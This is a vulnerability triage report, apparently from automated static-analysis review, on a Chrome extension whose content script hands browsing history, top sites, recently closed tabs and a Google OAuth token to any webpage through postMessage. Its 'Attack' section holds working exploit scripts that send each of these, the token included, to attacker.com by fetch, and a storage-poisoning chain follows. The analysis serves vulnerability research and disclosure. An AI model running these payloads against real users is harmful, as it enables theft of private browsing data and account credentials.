# CoCo Analysis: clnahiecfdigjlgmealkpajafoedcobp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (all related to different storage poisoning paths from same message handler)

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink (send_sidebar_settings)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/clnahiecfdigjlgmealkpajafoedcobp/opgen_generated_files/cs_0.js
Line 468: Multiple message handlers including `send_sidebar_settings` that writes `e.data.activeApps` and `e.data.appOrder` to storage

**Code:**

```javascript
// Content script - cs_0.js Line 468
window.addEventListener("message", (function(e) {
  if (e.source === window) {
    // ... other handlers ...

    // Handler 1: get_history - Information disclosure
    if (e.data && "get_history" === e.data.type) {
      chrome.runtime.sendMessage({
        message: "get_history",
        historySearch: e.data.historySearch  // ← attacker-controlled
      }, (function(t) {
        e.source.postMessage({
          type: "get_history_response",
          historyItems: t  // ← Sends browser history back to attacker
        })
      }))
    }

    // Handler 2: get_most_visited - Information disclosure
    if (e.data && "get_most_visited" === e.data.type) {
      chrome.runtime.sendMessage({message: "get_most_visited"}, (function(t) {
        e.source.postMessage({
          type: "get_most_visited_response",
          mostVisited: t  // ← Sends top sites back to attacker
        })
      }))
    }

    // Handler 3: get_recently_closed - Information disclosure
    if (e.data && "get_recently_closed" === e.data.type) {
      chrome.runtime.sendMessage({message: "get_recently_closed"}, (function(t) {
        e.source.postMessage({
          type: "get_recently_closed_response",
          recentlyClosed: t  // ← Sends recently closed tabs back to attacker
        })
      }))
    }

    // Handler 4: get_auth_token - Critical information disclosure
    if (e.data && "get_auth_token" === e.data.type) {
      chrome.runtime.sendMessage({message: "get_auth_token"}, (function(t) {
        e.source.postMessage({
          type: "get_auth_token_response",
          authToken: t  // ← Sends OAuth token back to attacker
        })
      }))
    }

    // Handler 5: send_sidebar_settings - Storage poisoning
    if (e.data && "send_sidebar_settings" === e.data.type) {
      const {activeApps: t, appOrder: s} = e.data;  // ← attacker-controlled
      chrome.runtime.sendMessage({
        message: "send_sidebar_settings",
        activeApps: t,
        appOrder: s
      })
    }

    // Handler 6: get_sidebar_settings - Complete storage exploitation
    if (e.data && "get_sidebar_settings" === e.data.type) {
      chrome.runtime.sendMessage({message: "get_sidebar_settings"}, (function(t) {
        e.source.postMessage({
          type: "get_sidebar_settings_response",
          activeApps: t.activeApps,  // ← Retrieves poisoned data
          appOrder: t.appOrder
        })
      }))
    }

    // Handler 7: update_inject_sidebar - Storage poisoning
    if (e.data && "update_inject_sidebar" === e.data.type) {
      chrome.runtime.sendMessage({
        message: "update_inject_sidebar",
        injectSidebar: e.data.data.injectSidebar  // ← attacker-controlled
      })
    }

    // Handler 8: get_inject_sidebar - Complete storage exploitation
    if (e.data && "get_inject_sidebar" === e.data.type) {
      chrome.runtime.sendMessage({message: "get_inject_sidebar"}, (function(t) {
        e.source.postMessage({
          type: "get_inject_sidebar_response",
          injectSidebar: t.injectSidebar  // ← Retrieves poisoned data
        })
      }))
    }

    // Handler 9: update_theme - Storage poisoning
    if (e.data && "update_theme" === e.data.type) {
      chrome.runtime.sendMessage({
        message: "update_theme",
        theme: e.data.theme  // ← attacker-controlled
      })
    }

    // Handler 10: get_theme - Complete storage exploitation
    if (e.data && "get_theme" === e.data.type) {
      chrome.runtime.sendMessage({message: "get_theme"}, (function(t) {
        e.source.postMessage({
          type: "get_theme_response",
          theme: t.theme  // ← Retrieves poisoned data
        })
      }))
    }
  }
}));

// Background script - bg.js Line 966
chrome.runtime.onMessage.addListener(((e, t, s) => {
  // get_history handler
  if (e && "get_history" === e.message) {
    return chrome.history.search({
      text: e.historySearch,  // ← attacker-controlled search
      maxResults: 100
    }, (e => {
      s(e)  // ← Returns history to content script
    })), !0
  }

  // get_most_visited handler
  if (e && "get_most_visited" === e.message) {
    return chrome.topSites.get((function(e) {
      s(e)  // ← Returns top sites
    })), !0
  }

  // get_recently_closed handler
  if (e && "get_recently_closed" === e.message) {
    return chrome.sessions.getRecentlyClosed({maxResults: 25}, (function(e) {
      let t = [];
      for (let s of e) {
        if (!s.tab || s.tab.url.startsWith("chrome") || s.tab.url.startsWith("file")) {
          if (s.window && s.window.tabs) {
            for (let e of s.window.tabs) {
              !e || e.url.startsWith("chrome") || e.url.startsWith("file") || t.push(e)
            }
          }
        } else t.push(s.tab)
      }
      s(Array.from(new Set(t)))  // ← Returns recently closed tabs
    })), !0
  }

  // get_auth_token handler - CRITICAL
  if (e && "get_auth_token" === e.message) {
    return chrome.identity.getAuthToken({interactive: !0}, (e => {
      console.log("sending this token", e),
      s({token: e})  // ← Returns OAuth token
    })), !0
  }

  // send_sidebar_settings handler
  if (e && "send_sidebar_settings" === e.message) {
    const {activeApps: t, appOrder: s} = e;
    return chrome.storage.local.set({
      activeApps: t,  // ← Stores attacker-controlled data
      appOrder: s
    }), !0
  }

  // get_sidebar_settings handler
  if (e && "get_sidebar_settings" === e.message) {
    return chrome.storage.local.get(["activeApps", "appOrder"], (e => {
      s(e)  // ← Returns stored settings (can be poisoned)
    })), !0
  }

  // update_inject_sidebar handler
  if (e && "update_inject_sidebar" === e.message) {
    return chrome.storage.local.set({
      injectSidebar: e.injectSidebar  // ← Stores attacker-controlled data
    }), !0
  }

  // get_inject_sidebar handler
  if (e && "get_inject_sidebar" === e.message) {
    return chrome.storage.local.get("injectSidebar", (e => {
      e.injectSidebar,
      s(e)  // ← Returns stored setting (can be poisoned)
    })), !0
  }

  // update_theme handler
  if (e && "update_theme" === e.message) {
    return chrome.storage.local.set({
      theme: e.theme  // ← Stores attacker-controlled data
    }), !0
  }

  // get_theme handler
  if (e && "get_theme" === e.message) {
    return chrome.storage.local.get("theme", (e => {
      s(e)  // ← Returns stored theme (can be poisoned)
    })), !0
  }

  return void 0
}));
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Exploit 1: Steal browser history
window.postMessage({
  type: "get_history",
  historySearch: ""  // Empty search returns all history
}, "*");

// Listen for the response
window.addEventListener("message", (event) => {
  if (event.data.type === "get_history_response") {
    console.log("Stolen history:", event.data.historyItems);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/collect", {
      method: "POST",
      body: JSON.stringify(event.data.historyItems)
    });
  }
});

// Exploit 2: Steal most visited sites
window.postMessage({type: "get_most_visited"}, "*");

window.addEventListener("message", (event) => {
  if (event.data.type === "get_most_visited_response") {
    console.log("Stolen top sites:", event.data.mostVisited);
    fetch("https://attacker.com/collect", {
      method: "POST",
      body: JSON.stringify(event.data.mostVisited)
    });
  }
});

// Exploit 3: Steal recently closed tabs
window.postMessage({type: "get_recently_closed"}, "*");

window.addEventListener("message", (event) => {
  if (event.data.type === "get_recently_closed_response") {
    console.log("Stolen recently closed:", event.data.recentlyClosed);
    fetch("https://attacker.com/collect", {
      method: "POST",
      body: JSON.stringify(event.data.recentlyClosed)
    });
  }
});

// Exploit 4: Steal OAuth authentication token (CRITICAL)
window.postMessage({type: "get_auth_token"}, "*");

window.addEventListener("message", (event) => {
  if (event.data.type === "get_auth_token_response") {
    console.log("CRITICAL - Stolen OAuth token:", event.data.authToken);
    // This token provides access to user's Google Calendar and Tasks
    fetch("https://attacker.com/critical", {
      method: "POST",
      body: JSON.stringify(event.data.authToken)
    });
  }
});

// Exploit 5: Complete storage exploitation chain
// Step 1: Poison storage
window.postMessage({
  type: "send_sidebar_settings",
  activeApps: ["malicious_app_1", "malicious_app_2"],
  appOrder: ["evil_order"]
}, "*");

// Step 2: Retrieve poisoned data
window.postMessage({type: "get_sidebar_settings"}, "*");

window.addEventListener("message", (event) => {
  if (event.data.type === "get_sidebar_settings_response") {
    console.log("Retrieved poisoned settings:", event.data);
    // Confirm successful storage poisoning
  }
});
```

**Impact:** Multiple critical vulnerabilities:
1. **Information Disclosure (High Severity)**: Attacker can exfiltrate complete browsing history, most visited sites, and recently closed tabs, revealing sensitive user behavior and potentially confidential URLs
2. **OAuth Token Theft (Critical Severity)**: Attacker can steal OAuth authentication tokens for Google Calendar and Tasks APIs, allowing unauthorized access to user's calendar events and task lists
3. **Complete Storage Exploitation**: Attacker can poison and retrieve extension storage settings, though this has lower impact compared to the information disclosure vulnerabilities

---

## Sink 2-4: Additional storage poisoning paths

**Classification:** TRUE POSITIVE (covered in Sink 1 analysis)

**Reason:** CoCo detected 4 separate taint flows, but they all originate from the same `window.addEventListener("message")` handler at line 468. The different flows correspond to different attacker-controlled fields (historySearch, activeApps/appOrder, injectSidebar, theme) that flow to chrome.storage.local.set. All of these are part of the comprehensive attack surface described in Sink 1.

---

## Overall Assessment Explanation

Extension clnahiecfdigjlgmealkpajafoedcobp has **MULTIPLE TRUE POSITIVE vulnerabilities** of varying severity.

The most critical vulnerability is the OAuth token theft via the `get_auth_token` handler, which allows attackers to steal authentication tokens for Google Calendar and Tasks APIs. This represents a severe security breach as it enables unauthorized access to sensitive user data.

Additionally, the extension exposes multiple information disclosure vulnerabilities that allow attackers to exfiltrate complete browsing history, most visited sites, and recently closed tabs through simple postMessage calls from any malicious webpage.

The storage poisoning vulnerabilities, while forming complete exploitation chains (write → read → postMessage back to attacker), have lower practical impact compared to the direct information disclosure paths.

All vulnerabilities are exploitable via window.postMessage from any webpage where the extension's content script is injected (all_urls per manifest.json).
